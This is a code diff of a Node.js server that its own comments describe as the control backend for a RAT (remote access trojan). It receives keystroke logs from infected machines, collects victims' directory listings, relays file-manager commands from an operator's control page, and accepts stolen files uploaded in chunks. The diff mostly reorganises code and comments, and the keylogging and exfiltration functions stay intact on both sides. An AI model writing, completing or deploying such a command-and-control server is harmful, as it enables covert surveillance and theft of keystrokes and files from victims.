@@ -2,173 +2,168 @@
 
 const http = require('http');//needed for communication
 const https = require('https');//needed for secure communication
-const fs = require('fs');//read files
-const path = require('path');
+const fs = require('fs');//File system
+const path = require('path');//Path parser
 const port = 1999;//port for the server
 
-let keylog = [];
-let folders = { files: [], current_dir: [] };
-let mediastream
-let dirman_instruction = undefined;
-let tempdetails = {}
+let keylog = [];//keylog buffr
+let folders = { files: [], current_dir: [] };//Directory emulation
+let mediastream;//media stream placeeholder
+let dirman_instruction = undefined;//tmporary directory lookup instructions
+let tempdetails = {}//tmporary file details
 
 //404 page goes here
 function notfoundpage(res, url) {
-    res.writeHead(404);//write head 404 so the client expects an error message
+    res.writeHead(404);// 404 error message
     res.write('404, code: ' + url);
     console.error('File not found: ', url)
 }
 
 ///Create server
 const server = http.createServer(function (req, res) {
-    //What the webpage will expect ot receive, res = response, req = request
+    //req = request, res = response
 
-    //console.log('Request Url: ', req);
-    //console.log('Raw rsponse: ',res)
+    //console.log('Request: ', req.url);
 
     res.setHeader('Acess-Control-Allow-Origin', '*');//allow access control from client, this will automatically handle most media files
 
-    switch (req.url) {
-        case '/':
-        case '/index.html'://requested url at the start of the site
+    try {//server hits exit code if an error isnt handled
 
-            res.writeHead(200, { 'Content-type': 'text/html' });//200 ok
-            fs.readFile('index.html', function (err, data) {//read index.html file
-                if (err) {//error because file not found/inaccesible
-                    notfoundpage(res, 'index');//show 404 page
-                } else {//File read successful
-                    res.write(data);//respond with data from file
-                }
-                res.end();//end response
-            })
+        switch (req.url) {//handle request
 
-            break;
+            case '/':
+            case '/index.html'://requested url at the start of the site
 
-        case '/action/get/keylog'://send keylog to page
+                res.writeHead(200, { 'Content-type': 'text/html' });//200 ok
+                fs.readFile('index.html', function (err, databuffer) {//read index.html file
+                    if (err) {//error because file not found/inaccesible
+                        notfoundpage(res, 'index');//show 404 page
+                    } else {//File read successful
+                        res.write(databuffer);//respond with data from file
+                    }
+                    res.end();//end response
+                })
 
-            //console.log('keylog request: ', keylog)
-            res.writeHead(200, { 'Content-type': 'application/json' });//200 ok
-            res.write(JSON.stringify(keylog))
-            res.end()
+                break;
 
-            break;
+            case '/action/get/keylog'://send keylog as response
 
-        case '/action/post/keylog'://receive keylog from page
-
-            req.on('data', function (data) {
-                keylog = JSON.parse(data)
-                //console.log('Keylog data :', keylog)
+                res.writeHead(200, { 'Content-type': 'application/json' });
+                res.write(JSON.stringify(keylog))
                 res.end()
-            });
 
-            break;
+                break;
 
-        case '/action/get/folders'://Get folders from server
+            case '/action/post/keylog'://receive keylog from Rat
 
-            //console.log('folder request: ', folders)
-            res.writeHead(200, { 'Content-type': 'application/json' });//200 ok
-            res.write(JSON.stringify(folders))
-            res.end()
-
-            break;
-
-        case '/action/post/folders'://receive folders from page
-
-            req.on('data', function (data) {
-                folders = JSON.parse(data)
-                //console.log('folder data :', folders)
-                //respond with instruction
-                res.writeHead(200, { 'Content-type': 'application/json' });//200 ok
-                //console.log(dirman_instruction)
-                if (dirman_instruction != undefined) {
-                    res.end(JSON.stringify(dirman_instruction))
-                } else {
+                req.on('data', function (data) {
+                    keylog = JSON.parse(data)
                     res.end()
-                }
-                dirman_instruction = undefined;
-            });
+                });
 
-            break;
+                break;
 
-        case '/action/post/folders/instruct'://receive folder instructions from Control page
+            case '/action/get/folders'://Reply folder data to control page
 
-            req.on('data', function (data) {
-                dirman_instruction = JSON.parse(data)
-                console.log('folder instruction data :', dirman_instruction)
-                res.writeHead(200, { 'Content-type': 'application/json' });//200 ok
-                res.end(JSON.stringify({ server: 'instruction received' }))
-            });
+                res.writeHead(200, { 'Content-type': 'application/json' });
+                res.end(JSON.stringify(folders))
 
-            break;
+                break;
 
-        case '/action/post/file/buffer'://Multiple file chunks should arrive in quick sucession
+            case '/action/post/folders'://receive folders from RAT as binary buffer
 
-            req.on('data', function (data) {
-                //console.log('file buffer posted', data);
-                /*var file = JSON.parse(data);*/
-                //console.log('File data :', data)
-                //console.log('writing to :', path.join('temp/', tempdetails.base));
-                //try {//try to write rceived file
-                try {
+                req.on('data', function (data) {
+                    folders = JSON.parse(data)
+                    res.writeHead(200, { 'Content-type': 'application/json' });//200 ok
+                    if (dirman_instruction != undefined) {
+                        res.write(JSON.stringify(dirman_instruction))//Reply with instructions from control page
+                        dirman_instruction = undefined;//reset instructions
+                    }
+                    res.end();
+                });
+
+                break;
+
+            case '/action/post/folders/instruct'://receive folder instructions from Control page
+
+                req.on('data', function (data) {
+                    dirman_instruction = JSON.parse(data)
+                    console.log('folder instruction data :', dirman_instruction)
+                    res.writeHead(200, { 'Content-type': 'application/json' });//200 ok, response json data
+                    res.end(JSON.stringify({ server: 'instruction received' }))
+                });
+
+                break;
+
+            case '/action/post/file/buffer'://Multiple file chunks should arrive in quick sucession
+
+                req.on('data', function (data) {
                     fs.appendFile(path.join('temp/', tempdetails.base), data, function (err) { if (err) { throw err; } })
-                    //data.pipe(instream)
                     res.end();
-                } catch (err) {
-                    console.error(err)
-                }
-                //} catch (err) { console.error(err) }
+                });
 
+                break;
 
-            });
+            case '/action/post/file/info'://receive file data instructions before buffers are posted
 
-            break;
+                req.on('data', function (data) {
+                    tempdetails = JSON.parse(data);//Incomming file details before buffers
+                    var fpath = path.join('temp/', tempdetails.base)
 
-        case '/action/post/file/info'://receive file data instructions before buffers are posted
+                    if (!fs.existsSync('temp/')) {
+                        fs.mkdirSync('temp/')//create folder
+                    } else {
+                        if (fs.existsSync(fpath)) { fs.unlink(fpath, function (err) { if (err) throw err; }) }//delete file if it already exists
+                    }
 
-            req.on('data', function (data) {
+                    console.log('Created file: ', fpath)
+                    res.end();
+                });
 
-                tempdetails = JSON.parse(data);//Incomming details
+                break;
 
-                //Ensure folder and file exist and are ready
+            case '/action/get/temp':
                 try {
-                    if (!fs.existsSync('temp/')) { fs.mkdirSync('temp/') }//create folder
-                    //fs.writeFile('temp/' + tempdetails.base, null, function (err) { if (err) { throw err; } })//make/empty file
-                    console.log('Created file: ',path.join('temp/', tempdetails.base))
-                    res.end();
-                } catch (err) {//catch error
-                    console.log(err)
-                    res.end();
+                    fs.readdir('temp/', function (err, files) {
+                        if (err) { throw err };
+                        console.log(files)
+                        res.write(JSON.stringify(files))
+                        res.end()
+                    })
+                } catch (err) {
+                    console.log('couldn\'t read temp folder', err)
                 }
-            });
+                break;
 
-            break;
+            default://Request is for component of webpage
 
-        default://Request is for component of webpage
-
-            if (req.url.indexOf('.css') != -1) {//requested url is a css file
-                res.setHeader('Content-type', 'text/css');//Set the header to css, so the client will expects a css document
-            }
-            else if (req.url.indexOf('.js') != -1) { //requested url is a js file
-                res.setHeader('Content-type', 'application/javascript');//Set the header to javascript, so the client will expects a javascript document
-            }
-            else if (req.url.indexOf('.html') != -1) {//requested url is a html file
-                res.setHeader('Content-type', 'text/html');//Set the header to html, so the client will expects a html document
-            }
-            else {
-                //media handled automatically
-            }
-
-            fs.readFile(req.url.replace('/', ''), function (err, data) {//read req.url.replace('/', '') file
-                if (err) {//error because file not found/inaccesible
-                    notfoundpage(res, req.url);//show 404 page
+                if (req.url.indexOf('.css') != -1) {//requested url is a css file
+                    res.setHeader('Content-type', 'text/css');//Set the header to css, so the client will expects a css document
+                } else if (req.url.indexOf('.js') != -1) { //requested url is a js file
+                    res.setHeader('Content-type', 'application/javascript');//Set the header to javascript, so the client will expects a javascript document
+                } else if (req.url.indexOf('.html') != -1) {//requested url is a html file
+                    res.setHeader('Content-type', 'text/html');//Set the header to html, so the client will expects a html document
                 } else {
-                    res.writeHead(200);//200 ok
-                    res.write(data);//respond with data from file
+                    //media handled automatically
                 }
-                res.end();//end response
-            })
+
+                fs.readFile(req.url.replace('/', ''), function (err, data) {//read req.url.replace('/', '') file
+                    if (err) {//error because file not found/inaccesible
+                        notfoundpage(res, req.url);//show 404 page
+                    } else {
+                        res.writeHead(200);//200 ok
+                        res.write(data);//respond with data from file
+                    }
+                    res.end();//end response
+                })
+
+        }
 
     }
+    catch (err) {
+        console.log('Error: ', err)
+    }
+
 
 }).listen(port, function (err) {//Listen to a port with server
 
